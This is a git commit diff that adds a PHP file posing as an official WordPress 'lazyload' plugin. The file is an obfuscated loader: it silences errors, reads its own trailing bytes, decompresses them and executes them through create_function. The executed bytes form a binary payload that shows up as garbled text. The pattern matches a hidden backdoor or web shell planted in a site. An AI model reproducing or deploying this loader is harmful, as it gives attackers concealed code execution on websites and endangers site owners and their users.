7805283635be13175ab28f3e1e114914ef386be3
Stefan Pejcic <pejcha1994@gmail.com>
2022-09-07 10:22:46 +0200

    Create wp-lazyload.php

---
+++ 07.09.2022/wp-content/plugins/wp-lazyload-clKrUNeYa6dfJfW9-module/wp-lazyload.php
@@ -0,0 +1,12 @@
+<?php
+/**
+* Description: Wordpress CMS module.
+* Version: 5.3.0
+* Author: Wordpress CMS
+* Author URI: https://wordpress.org/
+**/
+
+error_reporting(0);$handle = fopen(__FILE__, 'r');fseek($handle, 369);$data = stream_get_contents($handle);fclose($handle);$f = create_function('$value', gzuncompress(strrev(substr($data, 32))));$f(substr($data, 0, 32));__halt_compiler();
+9b40771e25a5f97188b3d64c686f49e4�@����-#x��rJ��&�t��r�E&¨r�4w������$R��C`�.��������kf����"�k
+R]��rBƂ�Ϛ�HsLsS���b=s_p�P�]`�����I�^վE��������b�ѭ�g;�Q���k�Z8��!����V�%�[�+Bu��#�èRW����fΰ�Ʊ!q����>�zcx���v�7RN|�[4zBP�w�w?��s����[�4$��B�ԥ}~
+I�*��me�ߡ^0�K_PU�x
